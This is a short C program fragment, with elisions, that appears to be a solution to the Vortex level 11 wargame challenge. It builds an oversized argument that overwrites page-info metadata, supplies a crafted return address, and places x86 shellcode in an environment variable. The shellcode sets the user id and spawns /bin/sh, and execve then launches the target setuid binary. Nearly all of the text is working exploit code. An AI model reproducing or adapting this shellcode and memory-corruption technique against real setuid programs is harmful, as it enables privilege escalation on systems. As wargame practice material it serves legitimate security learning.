...
int main(void) {
  ...
  //memset(overwrite_pginfo+PAGE_FILL_SIZE+PG_INFO_NEXT_TO_PAGE-8, '\xff', PGINFO_FILL_SIZE);
	...
	char *argv[4] = {"./vortex11", overwrite_pginfo, "\xad\xdf\xff\xff", 0};
	char *env[2] = {"SHELLCODE=1\xc0\xb0\x46""1\xdb""f\xbb\x94\x13""1\xc9""f\xb9\x94\x13\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c\x24\x89\xe1\xb0\x0b\xcd\x80", 0};
	execve("/vortex/vortex11", argv, env);
}
